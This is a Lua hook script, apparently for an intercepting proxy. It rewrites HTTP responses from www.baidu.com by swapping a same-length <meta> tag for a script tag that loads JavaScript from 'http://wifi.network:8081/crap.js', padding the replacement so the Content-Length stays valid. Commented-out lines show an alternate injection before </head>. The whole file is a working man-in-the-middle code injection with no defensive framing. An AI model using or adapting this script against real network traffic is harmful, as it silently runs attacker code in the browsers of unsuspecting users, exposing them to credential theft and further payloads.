--local zlib = require "zlib"
--local buffer = {}

local script = '<script src="http://wifi.network:8081/crap.js"></script>'
local scriptLen = string.len(script)

function tableLen(t)
	local count = 0
	for _ in pairs(t) do count = count + 1 end
	return count
end 

function matchHost(host, html, pattern)
	for matched in string.gmatch(html, pattern) do
		if (string.len(matched) >= scriptLen) then
			print ("found ========== " .. matched) 	
			return string.gsub(matched, '-', '.') --HOLY SHIT
		end	
	end
	return nil
end

function padding(src)
	print("padding ============ src    " .. src)
	if (string.len(src) < scriptLen) then
		print("[WARN]: src.length must be >= script.length.")
		return nil
	end
	local n = string.len(src) - scriptLen
	return string.rep(" ", n)..script
end

function modify(data, isbody, ctx, host) -- response only
	print(isbody, ctx, host)	

	if (host == "www.baidu.com" ) then
--		if (buffer[ctx] == nil) then
			local matched = matchHost(host, data, "<meta.->")
			if (matched) then 
				local dst = padding(matched)				
				data = string.gsub(data, matched, dst)				
				print("replace " .. ctx .. " ======= src    " .. matched .." ====== as " .. dst .. "==========\n" .. data)
			--	buffer[ctx] = 1
			end
--		end
	end

	data = string.gsub(data, "<head>", "<HEAD>")

	--if (isbody == false) then
		-- local len = data.gmatch(data, "Content.Length. (%d)+")()
		-- if (len) then
		-- 	print("replace len: " .. len .. " as : " .. (len + 31) )
		-- 	data = string.gsub(data, "Content.Length. %d+", "Content-Length: "..(len+31))
		-- end
	--else
		-- data = string.gsub(data, "</head>", '</HEAD><script src="crap.js"></script>')
	--end

    return data
end 
